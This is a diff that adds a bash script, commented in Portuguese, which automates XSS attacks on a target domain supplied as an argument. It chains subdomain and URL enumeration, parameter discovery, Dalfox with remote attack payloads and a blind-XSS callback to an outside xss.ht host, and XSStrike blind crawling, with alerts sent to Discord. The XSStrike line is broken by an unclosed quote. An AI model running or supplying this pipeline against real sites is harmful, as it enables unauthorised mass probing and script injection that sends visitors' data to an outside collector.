@@ -1,0 +1,31 @@
+#!/bin/bash
+alvo="$1"
+#Subdomains + Waybackurls
+findomain-linux -t $alvo -r | httpx -silent -threads 500 | anew | waybackurls | gf xss | anew urls.txt
+#amass enum -src -active -brute -d $alvo | httpx -silent -threads 500 | anew | waybackurls | anew sub.txt
+#Parameters with paramspider.py
+python3 /home/ferramentas/ParamSpider/paramspider.py -d $alvo -o parametersFUZZ.txt
+cat urls.txt output/parametersFUZZ.txt | anew alvos
+rm -rf output/parametersFUZZ.txt urls.txt
+cat alvos | Gxss -c 100 -o ALVOSREFLECTED
+
+sleep 2;
+#Test XSS 01
+sleep 2;
+#Teste XSS 02
+echo "Iniciando Dalfox $alvo" | notify -discord-username avisos
+dalfox  --ignore-return 301,302,403,404,500,502 file alvos --remote-wordlists=burp,assetnote  --remote-payloads=portswigger  | notify -discord-username xss
+echo "Primeiro Dalfox concluido" | notify -discord-username avisos
+sleep 1;
+#Teste XSS 03
+dalfox file ALVOSREFLECTED pipe --worker 200   --mining-dict /home/ferramentas/Arjun/arjun/db/params.txt --skip-bav  -b kauenavarro.xss.ht | notify -discord-username xssbav
+echo "Segundo Dalfox conluido " | notify -discord-username avisos
+sleep 2;
+#Texte XSS 04
+echo "etapa dalfox concluida " | notify -discord-username avisos
+
+xargs -a ALVOSREFLECTED -I@ sh -c 'python3 /home/ferramentas/XSStrike/xsstrike.py -u "@" --crawl --blind | notify -discord-username xsstrike
+echo "etapa xsstrike apagando arquivos de base xss" | notify -discord-username avisos
+
+rm alvos
+rm ALVOSREFLECTED
